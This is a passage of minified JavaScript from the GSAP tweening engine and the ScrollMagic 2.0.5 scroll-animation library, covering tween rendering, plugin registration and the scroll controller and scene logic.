            }), e && (n = j[s].tweens, n[r = n.length] = e, i)) for (; --r > -1;) n[r] === e && n.splice(r, 1);
            return j[s].tweens
        },
        Q = function(t, e, i, n) {
            var r, s, a = t.vars.onOverwrite;
            return a && (r = a(t, e, i, n)),
            a = M.onOverwrite,
            a && (s = a(t, e, i, n)),
            r !== !1 && s !== !1
        },
        J = function(t, e, i, n, r) {
            var s, a, o, l;
            if (1 === n || n >= 4) {
                for (l = r.length, s = 0; s < l; s++) if ((o = r[s]) !== e) o._gc || o._kill(null, t, e) && (a = !0);
                else if (5 === n) break;
                return a
            }
            var c, h = e._startTime + 1e-10,
            u = [],
            d = 0,
            p = 0 === e._duration;
            for (s = r.length; --s > -1;)(o = r[s]) === e || o._gc || o._paused || (o._timeline !== e._timeline ? (c = c || K(e, 0, p), 0 === K(o, c, p) && (u[d++] = o)) : o._startTime <= h && o._startTime + o.totalDuration() / o._timeScale > h && ((p || !o._initted) && h - o._startTime <= 2e-10 || (u[d++] = o)));
            for (s = d; --s > -1;) if (o = u[s], 2 === n && o._kill(i, t, e) && (a = !0), 2 !== n || !o._firstPT && o._initted) {
                if (2 !== n && !Q(o, e)) continue;
                o._enabled(!1, !1) && (a = !0)
            }
            return a
        },
        K = function(t, e, i) {
            for (var n = t._timeline,
            r = n._timeScale,
            s = t._startTime; n._timeline;) {
                if (s += n._startTime, r *= n._timeScale, n._paused) return - 100;
                n = n._timeline
            }
            return s /= r,
            s > e ? s - e: i && s === e || !t._initted && s - e < 2e-10 ? 1e-10: (s += t.totalDuration() / t._timeScale / r) > e + 1e-10 ? 0 : s - e - 1e-10
        };
        o._init = function() {
            var t, e, i, n, r, s, a = this.vars,
            o = this._overwrittenProps,
            l = this._duration,
            c = !!a.immediateRender,
            h = a.ease;
            if (a.startAt) {
                this._startAt && (this._startAt.render( - 1, !0), this._startAt.kill()),
                r = {};
                for (n in a.startAt) r[n] = a.startAt[n];
                if (r.overwrite = !1, r.immediateRender = !0, r.lazy = c && a.lazy !== !1, r.startAt = r.delay = null, this._startAt = M.to(this.target, 0, r), c) if (this._time > 0) this._startAt = null;
                else if (0 !== l) return
            } else if (a.runBackwards && 0 !== l) if (this._startAt) this._startAt.render( - 1, !0),
            this._startAt.kill(),
            this._startAt = null;
            else {
                0 !== this._time && (c = !1),
                i = {};
                for (n in a) X[n] && "autoCSS" !== n || (i[n] = a[n]);
                if (i.overwrite = 0, i.data = "isFromStart", i.lazy = c && a.lazy !== !1, i.immediateRender = c, this._startAt = M.to(this.target, 0, i), c) {
                    if (0 === this._time) return
                } else this._startAt._init(),
                this._startAt._enabled(!1),
                this.vars.immediateRender && (this._startAt = null)
            }
            if (this._ease = h = h ? h instanceof b ? h: "function" == typeof h ? new b(h, a.easeParams) : w[h] || M.defaultEase: M.defaultEase, a.easeParams instanceof Array && h.config && (this._ease = h.config.apply(h, a.easeParams)), this._easeType = this._ease._type, this._easePower = this._ease._power, this._firstPT = null, this._targets) for (s = this._targets.length, t = 0; t < s; t++) this._initProps(this._targets[t], this._propLookup[t] = {},
            this._siblings[t], o ? o[t] : null, t) && (e = !0);
            else e = this._initProps(this.target, this._propLookup, this._siblings, o, 0);
            if (e && M._onPluginEvent("_onInitAllProps", this), o && (this._firstPT || "function" != typeof this.target && this._enabled(!1, !1)), a.runBackwards) for (i = this._firstPT; i;) i.s += i.c,
            i.c = -i.c,
            i = i._next;
            this._onUpdate = a.onUpdate,
            this._initted = !0
        },
        o._initProps = function(e, i, n, r, s) {
            var a, o, l, c, h, u;
            if (null == e) return ! 1;
            I[e._gsTweenID] && G(),
            this.vars.css || e.style && e !== t && e.nodeType && B.css && this.vars.autoCSS !== !1 && z(this.vars, e);
            for (a in this.vars) if (u = this.vars[a], X[a]) u && (u instanceof Array || u.push && f(u)) && u.join("").indexOf("{self}") !== -1 && (this.vars[a] = u = this._swapSelfInParams(u, this));
            else if (B[a] && (c = new B[a])._onInitTween(e, this.vars[a], this, s)) {
                for (this._firstPT = h = {
                    _next: this._firstPT,
                    t: c,
                    p: "setRatio",
                    s: 0,
                    c: 1,
                    f: 1,
                    n: a,
                    pg: 1,
                    pr: c._priority,
                    m: 0
                },
                o = c._overwriteProps.length; --o > -1;) i[c._overwriteProps[o]] = this._firstPT; (c._priority || c._onInitAllProps) && (l = !0),
                (c._onDisable || c._onEnable) && (this._notifyPluginsOfEnabled = !0),
                h._next && (h._next._prev = h)
            } else i[a] = N.call(this, e, a, "get", u, a, 0, null, this.vars.stringFilter, s);
            return r && this._kill(r, e) ? this._initProps(e, i, n, r, s) : this._overwrite > 1 && this._firstPT && n.length > 1 && J(e, this, i, this._overwrite, n) ? (this._kill(i, e), this._initProps(e, i, n, r, s)) : (this._firstPT && (this.vars.lazy !== !1 && this._duration || this.vars.lazy && !this._duration) && (I[e._gsTweenID] = !0), l)
        },
        o.render = function(t, e, i) {
            var n, r, s, a, o = this._time,
            l = this._duration,
            c = this._rawPrevTime;
            if (t >= l - 1e-7 && t >= 0) this._totalTime = this._time = l,
            this.ratio = this._ease._calcEnd ? this._ease.getRatio(1) : 1,
            this._reversed || (n = !0, r = "onComplete", i = i || this._timeline.autoRemoveChildren),
            0 === l && (this._initted || !this.vars.lazy || i) && (this._startTime === this._timeline._duration && (t = 0), (c < 0 || t <= 0 && t >= -1e-7 || 1e-10 === c && "isPause" !== this.data) && c !== t && (i = !0, c > 1e-10 && (r = "onReverseComplete")), this._rawPrevTime = a = !e || t || c === t ? t: 1e-10);
            else if (t < 1e-7) this._totalTime = this._time = 0,
            this.ratio = this._ease._calcEnd ? this._ease.getRatio(0) : 0,
            (0 !== o || 0 === l && c > 0) && (r = "onReverseComplete", n = this._reversed),
            t < 0 && (this._active = !1, 0 === l && (this._initted || !this.vars.lazy || i) && (c >= 0 && (1e-10 !== c || "isPause" !== this.data) && (i = !0), this._rawPrevTime = a = !e || t || c === t ? t: 1e-10)),
            this._initted || (i = !0);
            else if (this._totalTime = this._time = t, this._easeType) {
                var h = t / l,
                u = this._easeType,
                d = this._easePower; (1 === u || 3 === u && h >= .5) && (h = 1 - h),
                3 === u && (h *= 2),
                1 === d ? h *= h: 2 === d ? h *= h * h: 3 === d ? h *= h * h * h: 4 === d && (h *= h * h * h * h),
                this.ratio = 1 === u ? 1 - h: 2 === u ? h: t / l < .5 ? h / 2 : 1 - h / 2
            } else this.ratio = this._ease.getRatio(t / l);
            if (this._time !== o || i) {
                if (!this._initted) {
                    if (this._init(), !this._initted || this._gc) return;
                    if (!i && this._firstPT && (this.vars.lazy !== !1 && this._duration || this.vars.lazy && !this._duration)) return this._time = this._totalTime = o,
                    this._rawPrevTime = c,
                    F.push(this),
                    void(this._lazy = [t, e]);
                    this._time && !n ? this.ratio = this._ease.getRatio(this._time / l) : n && this._ease._calcEnd && (this.ratio = this._ease.getRatio(0 === this._time ? 0 : 1))
                }
                for (this._lazy !== !1 && (this._lazy = !1), this._active || !this._paused && this._time !== o && t >= 0 && (this._active = !0), 0 === o && (this._startAt && (t >= 0 ? this._startAt.render(t, e, i) : r || (r = "_dummyGS")), this.vars.onStart && (0 === this._time && 0 !== l || e || this._callback("onStart"))), s = this._firstPT; s;) s.f ? s.t[s.p](s.c * this.ratio + s.s) : s.t[s.p] = s.c * this.ratio + s.s,
                s = s._next;
                this._onUpdate && (t < 0 && this._startAt && t !== -1e-4 && this._startAt.render(t, e, i), e || (this._time !== o || n || i) && this._callback("onUpdate")),
                r && (this._gc && !i || (t < 0 && this._startAt && !this._onUpdate && t !== -1e-4 && this._startAt.render(t, e, i), n && (this._timeline.autoRemoveChildren && this._enabled(!1, !1), this._active = !1), !e && this.vars[r] && this._callback(r), 0 === l && 1e-10 === this._rawPrevTime && 1e-10 !== a && (this._rawPrevTime = 0)))
            }
        },
        o._kill = function(t, e, i) {
            if ("all" === t && (t = null), null == t && (null == e || e === this.target)) return this._lazy = !1,
            this._enabled(!1, !1);
            e = "string" != typeof e ? e || this._targets || this.target: M.selector(e) || e;
            var n, r, s, a, o, l, c, h, u, d = i && this._time && i._startTime === this._startTime && this._timeline === i._timeline;
            if ((f(e) || E(e)) && "number" != typeof e[0]) for (n = e.length; --n > -1;) this._kill(t, e[n], i) && (l = !0);
            else {
                if (this._targets) {
                    for (n = this._targets.length; --n > -1;) if (e === this._targets[n]) {
                        o = this._propLookup[n] || {},
                        this._overwrittenProps = this._overwrittenProps || [],
                        r = this._overwrittenProps[n] = t ? this._overwrittenProps[n] || {}: "all";
                        break
                    }
                } else {
                    if (e !== this.target) return ! 1;
                    o = this._propLookup,
                    r = this._overwrittenProps = t ? this._overwrittenProps || {}: "all"
                }
                if (o) {
                    if (c = t || o, h = t !== r && "all" !== r && t !== o && ("object" != typeof t || !t._tempKill), i && (M.onOverwrite || this.vars.onOverwrite)) {
                        for (s in c) o[s] && (u || (u = []), u.push(s));
                        if ((u || !t) && !Q(this, i, e, u)) return ! 1
                    }
                    for (s in c)(a = o[s]) && (d && (a.f ? a.t[a.p](a.s) : a.t[a.p] = a.s, l = !0), a.pg && a.t._kill(c) && (l = !0), a.pg && 0 !== a.t._overwriteProps.length || (a._prev ? a._prev._next = a._next: a === this._firstPT && (this._firstPT = a._next), a._next && (a._next._prev = a._prev), a._next = a._prev = null), delete o[s]),
                    h && (r[s] = 1); ! this._firstPT && this._initted && this._enabled(!1, !1)
                }
            }
            return l
        },
        o.invalidate = function() {
            return this._notifyPluginsOfEnabled && M._onPluginEvent("_onDisable", this),
            this._firstPT = this._overwrittenProps = this._startAt = this._onUpdate = null,
            this._notifyPluginsOfEnabled = this._active = this._lazy = !1,
            this._propLookup = this._targets ? {}: [],
            R.prototype.invalidate.call(this),
            this.vars.immediateRender && (this._time = -1e-10, this.render(Math.min(0, -this._delay))),
            this
        },
        o._enabled = function(t, e) {
            if (c || l.wake(), t && this._gc) {
                var i, n = this._targets;
                if (n) for (i = n.length; --i > -1;) this._siblings[i] = Z(n[i], this, !0);
                else this._siblings = Z(this.target, this, !0)
            }
            return R.prototype._enabled.call(this, t, e),
            !(!this._notifyPluginsOfEnabled || !this._firstPT) && M._onPluginEvent(t ? "_onEnable": "_onDisable", this)
        },
        M.to = function(t, e, i) {
            return new M(t, e, i)
        },
        M.from = function(t, e, i) {
            return i.runBackwards = !0,
            i.immediateRender = 0 != i.immediateRender,
            new M(t, e, i)
        },
        M.fromTo = function(t, e, i, n) {
            return n.startAt = i,
            n.immediateRender = 0 != n.immediateRender && 0 != i.immediateRender,
            new M(t, e, n)
        },
        M.delayedCall = function(t, e, i, n, r) {
            return new M(e, 0, {
                delay: t,
                onComplete: e,
                onCompleteParams: i,
                callbackScope: n,
                onReverseComplete: e,
                onReverseCompleteParams: i,
                immediateRender: !1,
                lazy: !1,
                useFrames: r,
                overwrite: 0
            })
        },
        M.set = function(t, e) {
            return new M(t, 0, e)
        },
        M.getTweensOf = function(t, e) {
            if (null == t) return [];
            t = "string" != typeof t ? t: M.selector(t) || t;
            var i, n, r, s;
            if ((f(t) || E(t)) && "number" != typeof t[0]) {
                for (i = t.length, n = []; --i > -1;) n = n.concat(M.getTweensOf(t[i], e));
                for (i = n.length; --i > -1;) for (s = n[i], r = i; --r > -1;) s === n[r] && n.splice(i, 1)
            } else for (n = Z(t).concat(), i = n.length; --i > -1;)(n[i]._gc || e && !n[i].isActive()) && n.splice(i, 1);
            return n
        },
        M.killTweensOf = M.killDelayedCallsTo = function(t, e, i) {
            "object" == typeof e && (i = e, e = !1);
            for (var n = M.getTweensOf(t, e), r = n.length; --r > -1;) n[r]._kill(i, t)
        };
        var tt = _("plugins.TweenPlugin",
        function(t, e) {
            this._overwriteProps = (t || "").split(","),
            this._propName = this._overwriteProps[0],
            this._priority = e || 0,
            this._super = tt.prototype
        },
        !0);
        if (o = tt.prototype, tt.version = "1.19.0", tt.API = 2, o._firstPT = null, o._addTween = N, o.setRatio = L, o._kill = function(t) {
            var e, i = this._overwriteProps,
            n = this._firstPT;
            if (null != t[this._propName]) this._overwriteProps = [];
            else for (e = i.length; --e > -1;) null != t[i[e]] && i.splice(e, 1);
            for (; n;) null != t[n.n] && (n._next && (n._next._prev = n._prev), n._prev ? (n._prev._next = n._next, n._prev = null) : this._firstPT === n && (this._firstPT = n._next)),
            n = n._next;
            return ! 1
        },
        o._mod = o._roundProps = function(t) {
            for (var e, i = this._firstPT; i;) e = t[this._propName] || null != i.n && t[i.n.split(this._propName + "_").join("")],
            e && "function" == typeof e && (2 === i.f ? i.t._applyPT.m = e: i.m = e),
            i = i._next
        },
        M._onPluginEvent = function(t, e) {
            var i, n, r, s, a, o = e._firstPT;
            if ("_onInitAllProps" === t) {
                for (; o;) {
                    for (a = o._next, n = r; n && n.pr > o.pr;) n = n._next; (o._prev = n ? n._prev: s) ? o._prev._next = o: r = o,
                    (o._next = n) ? n._prev = o: s = o,
                    o = a
                }
                o = e._firstPT = r
            }
            for (; o;) o.pg && "function" == typeof o.t[t] && o.t[t]() && (i = !0),
            o = o._next;
            return i
        },
        tt.activate = function(t) {
            for (var e = t.length; --e > -1;) t[e].API === tt.API && (B[(new t[e])._propName] = t[e]);
            return ! 0
        },
        v.plugin = function(t) {
            if (! (t && t.propName && t.init && t.API)) throw "illegal plugin definition.";
            var e, i = t.propName,
            n = t.priority || 0,
            r = t.overwriteProps,
            s = {
                init: "_onInitTween",
                set: "setRatio",
                kill: "_kill",
                round: "_mod",
                mod: "_mod",
                initAll: "_onInitAllProps"
            },
            a = _("plugins." + i.charAt(0).toUpperCase() + i.substr(1) + "Plugin",
            function() {
                tt.call(this, i, n),
                this._overwriteProps = r || []
            },
            t.global === !0),
            o = a.prototype = new tt(i);
            o.constructor = a,
            a.API = t.API;
            for (e in s)"function" == typeof t[e] && (o[s[e]] = t[e]);
            return a.version = t.version,
            tt.activate([a]),
            a
        },
        s = t._gsQueue) {
            for (a = 0; a < s.length; a++) s[a]();
            for (o in m) m[o].func || t.console.log("GSAP encountered missing dependency: " + o)
        }
        c = !1
    }
} ("undefined" != typeof module && module.exports && "undefined" != typeof global ? global: this || window),
function(t, e) {
    "function" == typeof define && define.amd ? define(e) : "object" == typeof exports ? module.exports = e() : t.ScrollMagic = e()
} (this,
function() {
    "use strict";
    var t = function() {
        n.log(2, "(COMPATIBILITY NOTICE) -> As of ScrollMagic 2.0.0 you need to use 'new ScrollMagic.Controller()' to create a new controller instance. Use 'new ScrollMagic.Scene()' to instance a scene.")
    };
    t.version = "2.0.5",
    window.addEventListener("mousewheel",
    function() {});
    t.Controller = function(i) {
        var r, s, a = "ScrollMagic.Controller",
        o = e.defaults,
        l = this,
        c = n.extend({},
        o, i),
        h = [],
        u = !1,
        d = 0,
        p = "PAUSED",
        f = !0,
        m = 0,
        g = !0,
        v = function() {
            c.refreshInterval > 0 && (s = window.setTimeout(k, c.refreshInterval))
        },
        _ = function() {
            return c.vertical ? n.get.scrollTop(c.container) : n.get.scrollLeft(c.container)
        },
        y = function() {
            return c.vertical ? n.get.height(c.container) : n.get.width(c.container)
        },
        b = this._setScrollPos = function(t) {
            c.vertical ? f ? window.scrollTo(n.get.scrollLeft(), t) : c.container.scrollTop = t: f ? window.scrollTo(t, n.get.scrollTop()) : c.container.scrollLeft = t
        },
        w = function() {
            if (g && u) {
                var t = n.type.Array(u) ? u: h.slice(0);
                u = !1;
                var e = d;
                d = l.scrollPos();
                var i = d - e;
                0 !== i && (p = i > 0 ? "FORWARD": "REVERSE"),
                "REVERSE" === p && t.reverse(),
                t.forEach(function(e, i) {
                    S(3, "updating Scene " + (i + 1) + "/" + t.length + " (" + h.length + " total)"),
                    e.update(!0)
                }),
                0 === t.length && c.loglevel >= 3 && S(3, "updating 0 Scenes (nothing added to controller)")
            }
        },
        x = function() {
            r = n.rAF(w)
        },
        T = function(t) {
            S(3, "event fired causing an update:", t.type),
            "resize" == t.type && (m = y(), p = "PAUSED"),
            u !== !0 && (u = !0, x())
        },
        k = function() {
            if (!f && m != y()) {
                var t;
                try {
                    t = new Event("resize", {
                        bubbles: !1,
                        cancelable: !1
                    })
                } catch(e) {
                    t = document.createEvent("Event"),
                    t.initEvent("resize", !1, !1)
                }
                c.container.dispatchEvent(t)
            }
            h.forEach(function(t, e) {
                t.refresh()
            }),
            v()
        },
        S = this._log = function(t, e) {
            c.loglevel >= t && (Array.prototype.splice.call(arguments, 1, 0, "(" + a + ") ->"), n.log.apply(window, arguments))
        };
        this._options = c;
        var C = function(t) {
            if (t.length <= 1) return t;
            var e = t.slice(0);
            return e.sort(function(t, e) {
                return t.scrollOffset() > e.scrollOffset() ? 1 : -1
            }),
            e
        };
        return this.addScene = function(e) {
            if (n.type.Array(e)) e.forEach(function(t, e) {
                l.addScene(t)
            });
            else if (e instanceof t.Scene) {
                if (e.controller() !== l) e.addTo(l);
                else if (h.indexOf(e) < 0) {
                    h.push(e),
                    h = C(h),
                    e.on("shift.controller_sort",
                    function() {
                        h = C(h)
                    });
                    for (var i in c.globalSceneOptions) e[i] && e[i].call(e, c.globalSceneOptions[i]);
                    S(3, "adding Scene (now " + h.length + " total)")
                }
            } else S(1, "ERROR: invalid argument supplied for '.addScene()'");
            return l
        },
        this.removeScene = function(t) {
            if (n.type.Array(t)) t.forEach(function(t, e) {
                l.removeScene(t)
            });
            else {
                var e = h.indexOf(t);
                e > -1 && (t.off("shift.controller_sort"), h.splice(e, 1), S(3, "removing Scene (now " + h.length + " left)"), t.remove())
            }
            return l
        },
        this.updateScene = function(e, i) {
            return n.type.Array(e) ? e.forEach(function(t, e) {
                l.updateScene(t, i)
            }) : i ? e.update(!0) : u !== !0 && e instanceof t.Scene && (u = u || [], u.indexOf(e) == -1 && u.push(e), u = C(u), x()),
            l
        },
        this.update = function(t) {
            return T({
                type: "resize"
            }),
            t && w(),
            l
        },
        this.scrollTo = function(e, i) {
            if (n.type.Number(e)) b.call(c.container, e, i);
            else if (e instanceof t.Scene) e.controller() === l ? l.scrollTo(e.scrollOffset(), i) : S(2, "scrollTo(): The supplied scene does not belong to this controller. Scroll cancelled.", e);
            else if (n.type.Function(e)) b = e;
            else {
                var r = n.get.elements(e)[0];
                if (r) {
                    for (; r.parentNode.hasAttribute("data-scrollmagic-pin-spacer");) r = r.parentNode;
                    var s = c.vertical ? "top": "left",
                    a = n.get.offset(c.container),
                    o = n.get.offset(r);
                    f || (a[s] -= l.scrollPos()),
                    l.scrollTo(o[s] - a[s], i)
                } else S(2, "scrollTo(): The supplied argument is invalid. Scroll cancelled.", e)
            }
            return l
        },
        this.scrollPos = function(t) {
            return arguments.length ? (n.type.Function(t) ? _ = t: S(2, "Provided value for method 'scrollPos' is not a function. To change the current scroll position use 'scrollTo()'."), l) : _.call(l)
        },
        this.info = function(t) {
            var e = {
                size: m,
                vertical: c.vertical,
                scrollPos: d,
                scrollDirection: p,
                container: c.container,
                isDocument: f
            };
            return arguments.length ? void 0 !== e[t] ? e[t] : void S(1, 'ERROR: option "' + t + '" is not available') : e
        },
        this.loglevel = function(t) {
            return arguments.length ? (c.loglevel != t && (c.loglevel = t), l) : c.loglevel
        },
        this.enabled = function(t) {
            return arguments.length ? (g != t && (g = !!t, l.updateScene(h, !0)), l) : g
        },
        this.destroy = function(t) {
            window.clearTimeout(s);
            for (var e = h.length; e--;) h[e].destroy(t);
            return c.container.removeEventListener("resize", T),
            c.container.removeEventListener("scroll", T),
            n.cAF(r),
            S(3, "destroyed " + a + " (reset: " + (t ? "true": "false") + ")"),
            null
        },
        function() {
            for (var e in c) o.hasOwnProperty(e) || (S(2, 'WARNING: Unknown option "' + e + '"'), delete c[e]);
            if (c.container = n.get.elements(c.container)[0], !c.container) throw S(1, "ERROR creating object " + a + ": No valid scroll container supplied"),
            a + " init failed.";
            f = c.container === window || c.container === document.body || !document.body.contains(c.container),
            f && (c.container = window),
            m = y(),
            c.container.addEventListener("resize", T),
            c.container.addEventListener("scroll", T),
            c.refreshInterval = parseInt(c.refreshInterval) || o.refreshInterval,
            v(),
            S(3, "added new " + a + " controller (v" + t.version + ")")
        } (),
        l
    };
    var e = {
        defaults: {
            container: window,
            vertical: !0,
            globalSceneOptions: {},
            loglevel: 2,
            refreshInterval: 100
        }
    };
    t.Controller.addOption = function(t, i) {
        e.defaults[t] = i
    },
    t.Controller.extend = function(e) {
        var i = this;
        t.Controller = function() {
            return i.apply(this, arguments),
            this.$super = n.extend({},
            this),
            e.apply(this, arguments) || this
        },
        n.extend(t.Controller, i),
        t.Controller.prototype = i.prototype,
        t.Controller.prototype.constructor = t.Controller
    },
    t.Scene = function(e) {
        var r, s, a = "ScrollMagic.Scene",
        o = i.defaults,
        l = this,
        c = n.extend({},
        o, e),
        h = "BEFORE",
        u = 0,
        d = {
            start: 0,
            end: 0
        },
        p = 0,
        f = !0,
        m = {};
        this.on = function(t, e) {
            return n.type.Function(e) ? (t = t.trim().split(" "), t.forEach(function(t) {
                var i = t.split("."),
                n = i[0],
                r = i[1];
                "*" != n && (m[n] || (m[n] = []), m[n].push({
                    namespace: r || "",
                    callback: e
                }))
            })) : g(1, "ERROR when calling '.on()': Supplied callback for '" + t + "' is not a valid function!"),
            l
        },
        this.off = function(t, e) {
            return t ? (t = t.trim().split(" "), t.forEach(function(t, i) {
                var n = t.split("."),
                r = n[0],
                s = n[1] || ""; ("*" === r ? Object.keys(m) : [r]).forEach(function(t) {
                    for (var i = m[t] || [], n = i.length; n--;) {
                        var r = i[n]; ! r || s !== r.namespace && "*" !== s || e && e != r.callback || i.splice(n, 1)
                    }
                    i.length || delete m[t]
                })
            }), l) : (g(1, "ERROR: Invalid event name supplied."), l)
        },
        this.trigger = function(e, i) {
            if (e) {
                var n = e.trim().split("."),
                r = n[0],
                s = n[1],
                a = m[r];
                g(3, "event fired:", r, i ? "->": "", i || ""),
                a && a.forEach(function(e, n) {
                    s && s !== e.namespace || e.callback.call(l, new t.Event(r, e.namespace, l, i))
                })
            } else g(1, "ERROR: Invalid event name supplied.");
            return l
        },
        l.on("change.internal",
        function(t) {
            "loglevel" !== t.what && "tweenChanges" !== t.what && ("triggerElement" === t.what ? y() : "reverse" === t.what && l.update())
        }).on("shift.internal",
        function(t) {
            v(),
            l.update()
        });
        var g = this._log = function(t, e) {
            c.loglevel >= t && (Array.prototype.splice.call(arguments, 1, 0, "(" + a + ") ->"), n.log.apply(window, arguments))
        };
        this.addTo = function(e) {
            return e instanceof t.Controller ? s != e && (s && s.removeScene(l), s = e, x(), _(!0), y(!0), v(), s.info("container").addEventListener("resize", b), e.addScene(l), l.trigger("add", {
                controller: s
            }), g(3, "added " + a + " to controller"), l.update()) : g(1, "ERROR: supplied argument of 'addTo()' is not a valid ScrollMagic Controller"),
            l
        },
        this.enabled = function(t) {
            return arguments.length ? (f != t && (f = !!t, l.update(!0)), l) : f
        },
        this.remove = function() {
            if (s) {
                s.info("container").removeEventListener("resize", b);
                var t = s;
                s = void 0,
                t.removeScene(l),
                l.trigger("remove"),
                g(3, "removed " + a + " from controller")
            }
            return l
        },
        this.destroy = function(t) {
            return l.trigger("destroy", {
                reset: t
            }),
            l.remove(),
            l.off("*.*"),
            g(3, "destroyed " + a + " (reset: " + (t ? "true": "false") + ")"),
            null
        },
        this.update = function(t) {
            if (s) if (t) if (s.enabled() && f) {
                var e, i = s.info("scrollPos");
                e = c.duration > 0 ? (i - d.start) / (d.end - d.start) : i >= d.start ? 1 : 0,
                l.trigger("update", {
                    startPos: d.start,
                    endPos: d.end,
                    scrollPos: i
                }),
                l.progress(e)
            } else S && "DURING" === h && P(!0);
            else s.updateScene(l, !1);
            return l
        },
        this.refresh = function() {
            return _(),
            y(),
            l
        },
        this.progress = function(t) {
            if (arguments.length) {
                var e = !1,
                i = h,
                n = s ? s.info("scrollDirection") : "PAUSED",
                r = c.reverse || t >= u;
                if (0 === c.duration ? (e = u != t, u = t < 1 && r ? 0 : 1, h = 0 === u ? "BEFORE": "DURING") : t < 0 && "BEFORE" !== h && r ? (u = 0, h = "BEFORE", e = !0) : t >= 0 && t < 1 && r ? (u = t, h = "DURING", e = !0) : t >= 1 && "AFTER" !== h ? (u = 1, h = "AFTER", e = !0) : "DURING" !== h || r || P(), e) {
                    var a = {
                        progress: u,
                        state: h,
                        scrollDirection: n
                    },
                    o = h != i,
                    d = function(t) {
                        l.trigger(t, a)
                    };
                    o && "DURING" !== i && (d("enter"), d("BEFORE" === i ? "start": "end")),
                    d("progress"),
                    o && "DURING" !== h && (d("BEFORE" === h ? "start": "end"), d("leave"))
                }
                return l
            }
            return u
        };
        var v = function() {
            d = {
                start: p + c.offset
            },
            s && c.triggerElement && (d.start -= s.info("size") * c.triggerHook),
            d.end = d.start + c.duration
        },
        _ = function(t) {
            if (r) {
                T("duration", r.call(l)) && !t && (l.trigger("change", {
                    what: "duration",
                    newval: c.duration
                }), l.trigger("shift", {
                    reason: "duration"
                }))
            }
        },
        y = function(t) {
            var e = 0,
            i = c.triggerElement;
            if (s && i) {
                for (var r = s.info(), a = n.get.offset(r.container), o = r.vertical ? "top": "left"; i.parentNode.hasAttribute("data-scrollmagic-pin-spacer");) i = i.parentNode;
                var h = n.get.offset(i);
                r.isDocument || (a[o] -= s.scrollPos()),
                e = h[o] - a[o]
            }
            var u = e != p;
            p = e,
            u && !t && l.trigger("shift", {
                reason: "triggerElementPosition"
            })
        },
        b = function(t) {
            c.triggerHook > 0 && l.trigger("shift", {
                reason: "containerResize"
            })
        },
        w = n.extend(i.validate, {
            duration: function(t) {
                if (n.type.String(t) && t.match(/^(\.|\d)*\d+%$/)) {
                    var e = parseFloat(t) / 100;
                    t = function() {
                        return s ? s.info("size") * e: 0
                    }
                }
                if (n.type.Function(t)) {
                    r = t;
                    try {
                        t = parseFloat(r())
                    } catch(e) {
                        t = -1
                    }
                }
                if (t = parseFloat(t), !n.type.Number(t) || t < 0) throw r ? (r = void 0, ['Invalid return value of supplied function for option "duration":', t]) : ['Invalid value for option "duration":', t];
                return t
            }
        }),
        x = function(t) {
            t = arguments.length ? [t] : Object.keys(w),
            t.forEach(function(t, e) {
                var i;
                if (w[t]) try {
                    i = w[t](c[t])
                } catch(e) {
                    i = o[t];
                    var r = n.type.String(e) ? [e] : e;
                    n.type.Array(r) ? (r[0] = "ERROR: " + r[0], r.unshift(1), g.apply(this, r)) : g(1, "ERROR: Problem executing validation callback for option '" + t + "':", e.message)
                } finally {
                    c[t] = i
                }
            })
        },
        T = function(t, e) {
            var i = !1,
            n = c[t];
            return c[t] != e && (c[t] = e, x(t), i = n != c[t]),
            i
        },
        k = function(t) {
            l[t] || (l[t] = function(e) {
                return arguments.length ? ("duration" === t && (r = void 0), T(t, e) && (l.trigger("change", {
                    what: t,
                    newval: c[t]
                }), i.shifts.indexOf(t) > -1 && l.trigger("shift", {
                    reason: t
                })), l) : c[t]
            })
        };
        this.controller = function() {
            return s
        },
        this.state = function() {
            return h
        },
        this.scrollOffset = function() {
            return d.start
        },
        this.triggerPosition = function() {
            var t = c.offset;
            return s && (t += c.triggerElement ? p: s.info("size") * l.triggerHook()),
            t
        };
        var S, C;
        l.on("shift.internal",
        function(t) {
            var e = "duration" === t.reason; ("AFTER" === h && e || "DURING" === h && 0 === c.duration) && P(),
            e && R()
        }).on("progress.internal",
        function(t) {
            P()
        }).on("add.internal",
        function(t) {
            R()
        }).on("destroy.internal",
        function(t) {
            l.removePin(t.reset)
        });
        var P = function(t) {
            if (S && s) {
                var e = s.info(),
                i = C.spacer.firstChild;
                if (t || "DURING" !== h) {
                    var r = {
                        position: C.inFlow ? "relative": "absolute",
                        top: 0,
                        left: 0
                    },
                    a = n.css(i, "position") != r.position;
                    C.pushFollowers ? c.duration > 0 && ("AFTER" === h && 0 === parseFloat(n.css(C.spacer, "padding-top")) ? a = !0 : "BEFORE" === h && 0 === parseFloat(n.css(C.spacer, "padding-bottom")) && (a = !0)) : r[e.vertical ? "top": "left"] = c.duration * u,
                    n.css(i, r),
                    a && R()
                } else {
                    "fixed" != n.css(i, "position") && (n.css(i, {
                        position: "fixed"
                    }), R());
                    var o = n.get.offset(C.spacer, !0),
                    l = c.reverse || 0 === c.duration ? e.scrollPos - d.start: Math.round(u * c.duration * 10) / 10;
                    o[e.vertical ? "top": "left"] += l,
                    n.css(C.spacer.firstChild, {
                        top: o.top,
                        left: o.left
                    })
                }
            }
        },
        R = function() {
            if (S && s && C.inFlow) {
                var t = "DURING" === h,
                e = s.info("vertical"),
                i = C.spacer.firstChild,
                r = n.isMarginCollapseType(n.css(C.spacer, "display")),
                a = {};
                C.relSize.width || C.relSize.autoFullWidth ? t ? n.css(S, {
                    width: n.get.width(C.spacer)
                }) : n.css(S, {
                    width: "100%"
                }) : (a["min-width"] = n.get.width(e ? S: i, !0, !0), a.width = t ? a["min-width"] : "auto"),
                C.relSize.height ? t ? n.css(S, {
                    height: n.get.height(C.spacer) - (C.pushFollowers ? c.duration: 0)
                }) : n.css(S, {
                    height: "100%"
                }) : (a["min-height"] = n.get.height(e ? i: S, !0, !r), a.height = t ? a["min-height"] : "auto"),
                C.pushFollowers && (a["padding" + (e ? "Top": "Left")] = c.duration * u, a["padding" + (e ? "Bottom": "Right")] = c.duration * (1 - u)),
                n.css(C.spacer, a)
            }
        },
        A = function() {
            s && S && "DURING" === h && !s.info("isDocument") && P()
        },
        O = function() {
            s && S && "DURING" === h && ((C.relSize.width || C.relSize.autoFullWidth) && n.get.width(window) != n.get.width(C.spacer.parentNode) || C.relSize.height && n.get.height(window) != n.get.height(C.spacer.parentNode)) && R()
        },
        M = function(t) {
            s && S && "DURING" === h && !s.info("isDocument") && (t.preventDefault(), s._setScrollPos(s.info("scrollPos") - ((t.wheelDelta || t[s.info("vertical") ? "wheelDeltaY": "wheelDeltaX"]) / 3 || 30 * -t.detail)))
        };
        this.setPin = function(t, e) {
